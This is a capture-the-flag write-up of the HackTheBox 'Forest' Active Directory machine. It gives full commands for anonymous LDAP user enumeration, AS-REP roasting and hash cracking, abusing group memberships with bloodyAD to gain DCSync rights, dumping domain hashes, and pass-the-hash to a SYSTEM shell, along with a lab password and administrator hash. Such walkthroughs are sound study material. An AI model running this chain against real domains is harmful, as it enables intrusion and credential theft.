---
title: "Forest HackTheBox" 
date: 2026-1-2 11:00:00 0000+
tags: [WriteUp, Forest, HTB, Enumeration, Active Directory, RID Bruteforcing, ASREP Roasting, faketime, mimikatz, DCSync, WriteDACL, Hash Cracking, Lateral Movement, Bloodhound, SMB, bloodyAD, Privilege Escalation, Psexec, Windows]
categories: [WriteUps, HackTheBox]
image:          
  path: /assets/images/Forest_HTB/preview_forest.png
---
# Forest HackTheBox

`Forest` is an easy Active Directory box from `HackTheBox` . Initial enumeration reveals us that there is null authentcation is enabled on `LDAP` which lets us enumerate the users on the box and then one of the users is vulnerble to `ASREPROASTING` which is a service account that can add users into a privileged group whose users are allowed to do a `DCSync` attack on the domain.  

![image.png](/assets/images/Forest_HTB/image.png)

## Initial Enumeration

### Rustmap

We start off with the rustmap to find open ports and services running on the box.

```bash
rustmap.py -ip 10.129.4.212
```

![image.png](/assets/images/Forest_HTB/image%201.png)

![image.png](/assets/images/Forest_HTB/image%202.png)

Looking at the results we have a several ports open identifying to which leads us to a conclusion that it is an Active Directory box which has `htb.local` as the domain and the hostname of the box be `forest`

Adding domain name and the hostname to our `/etc/hosts` file.

Also SMB and ADWS is running on the box.

The machine is `2 hrs 46 min` ahead of our attacker machine time.

So lets start with the basic enumeration with SMB.

### SMB Enumeration

Using Netexec to enumerate SMB for the Null authentication.

```bash
nxc smb forest.htb.local -u '' -p '' --shares
```

![image.png](/assets/images/Forest_HTB/image%203.png)

We have null authentication but we can enumerate the shares with it.

Testing with the `guest` authentication.

```bash
nxc smb forest.htb.local -u '.' -p '' --shares
```

![image.png](/assets/images/Forest_HTB/image%204.png)

We dont have guest authentication on this box.

We can get to anything here, so lets now enumerate `LDAP` part.

### LDAP Enumeration

Similary doing the same here with NetExec.

```bash
nxc ldap forest.htb.local -u '' -p ''
```

![image.png](/assets/images/Forest_HTB/image%205.png)

We have null authentication, lets try to enumerate the users on the box.

```bash
nxc ldap forest.htb.local -u '' -p '' --users
```

![image.png](/assets/images/Forest_HTB/image%206.png)

As you can see we can enumerate the users with null authentication.

Lets do the same with the groups.

```bash
nxc ldap forest.htb.local -u '' -p '' --groups
```

![image.png](/assets/images/Forest_HTB/image%207.png)

As you can see we can enumerate the groups also.

### ASREP Roasting

Performing a `asreproast` attack on the domain using NetExec.

```bash
nxc ldap forest.htb.local -u '' -p '' --asreproast asreproast.txt
```

![image.png](/assets/images/Forest_HTB/image%208.png)

Found one valid user which has an `SPN` set.

Lets crack `svc-alfresco` hash.

```bash
hashcat -m 18200 asreproast.txt /usr/share/wordlists/rockyou.txt
```

![image.png](/assets/images/Forest_HTB/image%209.png)

Succesfully cracked the hash for `svc-alfresco` user.

## Exploitation

### Auth as svc-alfresco

Checking for the winrm access.

```bash
nxc winrm forest.htb.local -u 'svc-alfresco' -p 's3rvice'
```

![image.png](/assets/images/Forest_HTB/image%2010.png)

We have a successfull `winrm` access to the box.

Lets not login and do some `bloodhound` analysis first.

### Rusthound

I will use `rusthound` to collect the domain data since now we have valid credentials.

```bash
rusthound -d htb.local -i 10.129.4.212 -u 'svc-alfresco' -p 's3rvice' -f forest.htb.local -z
```

![image.png](/assets/images/Forest_HTB/image%2011.png)

Marking the `svc-alfresco` as owned in bloodhound.

![image.png](/assets/images/Forest_HTB/image%2012.png)

`Svc-alfresco` is a part of `SERVICE ACCOUNTS` which is a part of `PRIVILEGED IT ACCOUNTS` which is part of `ACCOUNT OPERATORS` which has `GenericAll` privileges on the `ENTERPRISE KEY ADMINS` and `KEY ADMINS` which can then `ADDKEYCREDENTIAL` to the DC.

### SVC-ALFRESCO → ENTERPRISE KEY ADMINS

Using bloodyAD to take add ourselves to `KeyAdmins` and `Enterprise Key admins` group.

```bash
bloodyAD -u 'svc-alfresco' -p 's3rvice' -d htb.local -i 10.129.4.212 add groupMember 'ENTERPRISE KEY ADMINS' 'SVC-ALFRESCO'
```

![image.png](/assets/images/Forest_HTB/image%2013.png)

But with this we got to no where !

We can go with the `shadowCredentials` attack since we can `AddKeyCredential` to the DC.

But that did not work out for us.

## Privilege Escalation

After poking around in `bloodhound` for a while I found another path to the DC.

![image.png](/assets/images/Forest_HTB/image%2014.png)

Lets add our user to the `EXCHANGE WINDOWS PERMISSIONS` group using `bloodyAD`

### SVC-ALFRESCO → EXCHANGE WINDOWS PERMISSIONS

```bash
bloodyAD -u 'svc-alfresco' -p 's3rvice' -d htb.local -i 10.129.4.212 add groupMember 'EXCHANGE WINDOWS PERMISSIONS' 'SVC-ALFRESCO'
```

![image.png](/assets/images/Forest_HTB/image%2015.png)

Now we have `WriteDACL` over to the DC.

Which means we can now do a `DCSync`.

### DCSync

Now exploiting the `WriteDACL` privilege by granting it to `svc-alfresco`

```bash
bloodyAD -u 'svc-alfresco' -p 's3rvice' -d htb.local -i 10.129.4.212 add dcsync svc-alfresco
```

![image.png](/assets/images/Forest_HTB/image%2016.png)

Lets now perform a `DCSync` attack.

```bash
faketime -f '+4h37m08s' secretsdump.py  'htb.local'/'svc-alfresco':'s3rvice'@forest.htb.local -dc-ip 10.129.4.212
```

![image.png](/assets/images/Forest_HTB/image%2017.png)

We now own the administrator’s hash.

Lets authenticate with them and get a system shell on the DC.

### Shell as NT AUTHORITY\SYSTEM

Lets forge a `TGT` with admin’s hash.

```bash
faketime -f '+4h37m08s' getTGT.py -hashes :32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator -dc-ip 10.129.4.212
```

![image.png](/assets/images/Forest_HTB/image%2018.png)

Using `PSEXEC` to get on the box.

```bash
faketime -f '+4h37m08s' psexec.py -k -no-pass -dc-ip 10.129.4.212 forest.htb.local
```

![image.png](/assets/images/Forest_HTB/image%2019.png)

Now we claim both of our flags from their repective directories.

![image.png](/assets/images/Forest_HTB/image%2020.png)

Rooted!

![image.png](/assets/images/Forest_HTB/image%2021.png)

Thanks for reading 🙂